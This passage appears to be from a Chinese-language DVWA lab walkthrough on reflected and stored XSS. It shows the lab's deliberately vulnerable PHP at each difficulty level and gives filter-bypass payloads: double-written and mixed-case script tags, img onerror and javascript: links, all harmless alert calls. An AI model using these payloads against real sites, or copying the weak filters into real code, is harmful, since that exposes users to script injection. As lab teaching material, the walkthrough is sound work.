<span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240112205131439.png" alt="image-20240112205131439"></p>
<p>可以看见客户端这里对我们的输入的数据不进行url解码了，这样会导致标签失效，从而无法 XSS</p>
<h1>0x11 XSS(Reflected)</h1>
<h2 id="Low-11">Low</h2>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">header</span> <span class="token punctuation">(</span><span class="token string double-quoted-string">"X-XSS-Protection: 0"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">// Is there any input?</span>
<span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token function">array_key_exists</span><span class="token punctuation">(</span> <span class="token string double-quoted-string">"name"</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span> <span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'name'</span> <span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token constant">NULL</span> <span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token comment">// Feedback for end user</span>
    <span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;pre&gt;Hello '</span> <span class="token operator">.</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'name'</span> <span class="token punctuation">]</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'&lt;/pre&gt;'</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>这里只是判断是否存在name变量，如果存在直接插入</p><pre>标签中，不存在任何过滤</pre><p></p>
<pre class="line-numbers language-scss" data-language="scss"><code class="language-scss">&lt;script&gt;<span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'hacker'</span><span class="token punctuation">)</span>&lt;/script&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240112210440503.png" alt="image-20240112210440503"></p>
<h2 id="Medium-11">Medium</h2>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">header</span> <span class="token punctuation">(</span><span class="token string double-quoted-string">"X-XSS-Protection: 0"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">// Is there any input?</span>
<span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token function">array_key_exists</span><span class="token punctuation">(</span> <span class="token string double-quoted-string">"name"</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span> <span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'name'</span> <span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token constant">NULL</span> <span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token comment">// Get input</span>
    <span class="token variable">$name</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span> <span class="token string single-quoted-string">'&lt;script&gt;'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'name'</span> <span class="token punctuation">]</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token comment">// Feedback for end user</span>
    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;pre&gt;Hello <span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$name</span><span class="token punctuation">}</span></span>&lt;/pre&gt;"</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>将<script>过滤为空，这意味着可以大写或者双写绕过</p>
<pre class="line-numbers language-scss" data-language="scss"><code class="language-scss">&lt;s&lt;script>cript><span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'hacker'</span><span class="token punctuation">)</span>&lt;/script>
&lt;Script>cript><span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'hacker'</span><span class="token punctuation">)</span>&lt;/script><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240112210655274.png" alt="image-20240112210655274"></p>
<h2 id="High-11">High</h2>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">header</span> <span class="token punctuation">(</span><span class="token string double-quoted-string">"X-XSS-Protection: 0"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">// Is there any input?</span>
<span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token function">array_key_exists</span><span class="token punctuation">(</span> <span class="token string double-quoted-string">"name"</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span> <span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'name'</span> <span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token constant">NULL</span> <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token comment">// Get input</span>
    <span class="token variable">$name</span> <span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span> <span class="token string single-quoted-string">'/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'name'</span> <span class="token punctuation">]</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token comment">// Feedback for end user</span>
    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;pre>Hello <span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$name</span><span class="token punctuation">&#125;</span></span>&lt;/pre>"</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>过滤很全，将<script>标签中的每个字符都过滤了，但我们可以使用其他标签</p>
<pre class="line-numbers language-scss" data-language="scss"><code class="language-scss">&lt;img src=1 onerror=<span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'hacker'</span><span class="token punctuation">)</span>
&lt;a href = <span class="token string">'javascript:alert('</span>hacker<span class="token string">')'</span>>click&lt;/a><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240112210946716.png" alt="image-20240112210946716"></p>
<h2 id="Impossible-11">Impossible</h2>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token comment">// Is there any input?</span>
<span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token function">array_key_exists</span><span class="token punctuation">(</span> <span class="token string double-quoted-string">"name"</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span> <span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'name'</span> <span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token constant">NULL</span> <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token comment">// Check Anti-CSRF token</span>
    <span class="token function">checkToken</span><span class="token punctuation">(</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'user_token'</span> <span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$_SESSION</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'session_token'</span> <span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'index.php'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token comment">// Get input</span>
    <span class="token variable">$name</span> <span class="token operator">=</span> <span class="token function">htmlspecialchars</span><span class="token punctuation">(</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'name'</span> <span class="token punctuation">]</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token comment">// Feedback for end user</span>
    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;pre>Hello <span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$name</span><span class="token punctuation">&#125;</span></span>&lt;/pre>"</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token comment">// Generate Anti-CSRF token</span>
<span class="token function">generateSessionToken</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>防止CSRF，接着采用<code>htmlspecialchars</code>杜绝了特殊字符：</p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240112211143475.png" alt="image-20240112211143475"></p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240112211129022.png" alt="image-20240112211129022"></p>
<p>这意味着我们的任何事件标签都将无用</p>
<h1>0x12 XSS(Stored)</h1>
<h2 id="Low-12">Low</h2>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token keyword">isset</span><span class="token punctuation">(</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'btnSign'</span> <span class="token punctuation">]</span> <span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token comment">// Get input</span>
    <span class="token variable">$message</span> <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'mtxMessage'</span> <span class="token punctuation">]</span> <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//对字符串收尾去空</span>
    <span class="token variable">$name</span>    <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'txtName'</span> <span class="token punctuation">]</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token comment">// Sanitize message input</span>
    <span class="token variable">$message</span> <span class="token operator">=</span> <span class="token function">stripslashes</span><span class="token punctuation">(</span> <span class="token variable">$message</span> <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//取出反引号</span>
    <span class="token variable">$message</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">is_object</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token function">mysqli_real_escape_string</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token variable">$message</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">trigger_error</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span><span class="token punctuation">,</span> <span class="token constant">E_USER_ERROR</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token string double-quoted-string">""</span> <span class="token punctuation">:</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token comment">// Sanitize name input</span>
    <span class="token variable">$name</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">is_object</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token function">mysqli_real_escape_string</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token variable">$name</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">trigger_error</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span><span class="token punctuation">,</span> <span class="token constant">E_USER_ERROR</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token string double-quoted-string">""</span> <span class="token punctuation">:</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token comment">// Update database</span>
    <span class="token variable">$query</span>  <span class="token operator">=</span> <span class="token string double-quoted-string">"INSERT INTO guestbook ( comment, name ) VALUES ( '<span class="token interpolation"><span class="token variable">$message</span></span>', '<span class="token interpolation"><span class="token variable">$name</span></span>' );"</span><span class="token punctuation">;</span>
    <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">mysqli_query</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token variable">$query</span> <span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token keyword">die</span><span class="token punctuation">(</span> <span class="token string single-quoted-string">'&lt;pre>'</span> <span class="token operator">.</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">is_object</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token function">mysqli_error</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$___mysqli_res</span> <span class="token operator">=</span> <span class="token function">mysqli_connect_error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token variable">$___mysqli_res</span> <span class="token punctuation">:</span> <span class="token constant boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'&lt;/pre>'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token comment">//mysql_close();</span>
<span class="token punctuation">&#125;</span>
<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>可以看见对用户的输入在经过几个函数的处理后，插入了数据库，但并未做出对xss的过滤，但防止SQL注入</p>
<pre class="line-numbers language-none"><code class="language-none">&lt;script&gt;alert(&#39;hacker&#39;)&lt;&#x2F;script&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240112211743611.png" alt="image-20240112211743611"></p>
<p>可以看到当我们插入上述数据的时候，每当我们访问此页面，便会执行xss</p>
<h2 id="Medium-12">Medium</h2>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token keyword">isset</span><span class="token punctuation">(</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'btnSign'</span> <span class="token punctuation">]</span> <span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token comment">// Get input</span>
    <span class="token variable">$message</span> <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'mtxMessage'</span> <span class="token punctuation">]</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$name</span>    <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'txtName'</span> <span class="token punctuation">]</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment">// Sanitize message input</span>
    <span class="token variable">$message</span> <span class="token operator">=</span> <span class="token function">strip_tags</span><span class="token punctuation">(</span> <span class="token function">addslashes</span><span class="token punctuation">(</span> <span class="token variable">$message</span> <span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$message</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">is_object</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token function">mysqli_real_escape_string</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token variable">$message</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">trigger_error</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span><span class="token punctuation">,</span> <span class="token constant">E_USER_ERROR</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token string double-quoted-string">""</span> <span class="token punctuation">:</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$message</span> <span class="token operator">=</span> <span class="token function">htmlspecialchars</span><span class="token punctuation">(</span> <span class="token variable">$message</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token comment">// Sanitize name input</span>
    <span class="token variable">$name</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span> <span class="token string single-quoted-string">'&lt;script>'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span> <span class="token variable">$name</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$name</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">is_object</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token function">mysqli_real_escape_string</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token variable">$name</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">trigger_error</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span><span class="token punctuation">,</span> <span class="token constant">E_USER_ERROR</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token string double-quoted-string">""</span> <span class="token punctuation">:</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token comment">// Update database</span>
    <span class="token variable">$query</span>  <span class="token operator">=</span> <span class="token string double-quoted-string">"INSERT INTO guestbook ( comment, name ) VALUES ( '<span class="token interpolation"><span class="token variable">$message</span></span>', '<span class="token interpolation"><span class="token variable">$name</span></span>' );"</span><span class="token punctuation">;</span>
    <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">mysqli_query</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token variable">$query</span> <span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token keyword">die</span><span class="token punctuation">(</span> <span class="token string single-quoted-string">'&lt;pre>'</span> <span class="token operator">.</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">is_object</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token function">mysqli_error</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$___mysqli_res</span> <span class="token operator">=</span> <span class="token function">mysqli_connect_error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token variable">$___mysqli_res</span> <span class="token punctuation">:</span> <span class="token constant boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'&lt;/pre>'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token comment">//mysql_close();</span>
<span class="token punctuation">&#125;</span>
<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>可以看到这回对message做出了成功的过滤，但却忘记正确过滤name，只是将<script>标签替换为空</p>
<p>但这里由于对Name这一文本框有字数限制，但我们可以放到bp上，或者直接F12在html中直接修改</p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240112212232937.png" alt="image-20240112212232937"></p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240112212246035.png" alt="image-20240112212246035"></p>
<p>可以看到成功XSS，类似paylaod还有：</p>
<pre class="line-numbers language-scss" data-language="scss"><code class="language-scss">&lt;sc&lt;script>ript><span class="token function">alert</span><span class="token punctuation">(</span>XSS<span class="token punctuation">)</span>&lt;/script>
&lt;img src=x onerror=<span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'XSS'</span><span class="token punctuation">)</span>><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>当然还可以：审查元素手动将 <code>maxlength</code> 的值调大一点就可以了。</p>
<h2 id="High-12">High</h2>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token keyword">isset</span><span class="token punctuation">(</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'btnSign'</span> <span class="token punctuation">]</span> <span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token comment">// Get input</span>
    <span class="token variable">$message</span> <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'mtxMessage'</span> <span class="token punctuation">]</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$name</span>    <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'txtName'</span> <span class="token punctuation">]</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token comment">// Sanitize message input</span>
    <span class="token variable">$message</span> <span class="token operator">=</span> <span class="token function">strip_tags</span><span class="token punctuation">(</span> <span class="token function">addslashes</span><span class="token punctuation">(</span> <span class="token variable">$message</span> <span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$message</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">is_object</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token function">mysqli_real_escape_string</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token variable">$message</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">trigger_error</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span><span class="token punctuation">,</span> <span class="token constant">E_USER_ERROR</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token string double-quoted-string">""</span> <span class="token punctuation">:</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$message</span> <span class="token operator">=</span> <span class="token function">htmlspecialchars</span><span class="token punctuation">(</span> <span class="token variable">$message</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token comment">// Sanitize name input</span>
    <span class="token variable">$name</span> <span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span> <span class="token string single-quoted-string">'/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span> <span class="token variable">$name</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$name</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">is_object</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token function">mysqli_real_escape_string</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token variable">$name</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">trigger_error</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span><span class="token punctuation">,</span> <span class="token constant">E_USER_ERROR</span><span class="token 